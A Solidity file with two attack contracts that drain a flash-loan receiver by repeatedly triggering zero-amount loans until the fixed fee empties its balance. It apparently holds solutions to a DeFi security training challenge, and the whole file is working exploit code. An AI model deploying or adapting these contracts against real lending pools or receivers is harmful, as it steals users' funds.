// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
@title Naive-receiver Attack Contract
@author broccolirob
@notice Keep calling flash loan on behalf of receiver till fee drains them.
 */
contract NaiveReceiverAttack {
  function attack(address pool, address receiver) external {
    while (receiver.balance > 0) {
      (bool success, ) = pool.call(abi.encodeWithSignature("flashLoan(address,uint256)", receiver, 0));
      require(success);
    }
  }
}

/**
@title Naive-receiver Attack Contract
@author cmichel
@notice Clearer and more fool-proof solution to the problem.
 */
interface INaiveLendingPool {
  function fixedFee() external pure returns (uint256);
  function flashLoan(address borrower, uint256 borrowAmount) external;
}
contract BetterNaiveReceiverAttacker {
  function attack(INaiveLendingPool pool, address payable receiver) external {
    uint256 fee = pool.fixedFee();
    while (receiver.balance >= fee) {
      pool.flashLoan(receiver, 0);
    }
  }
}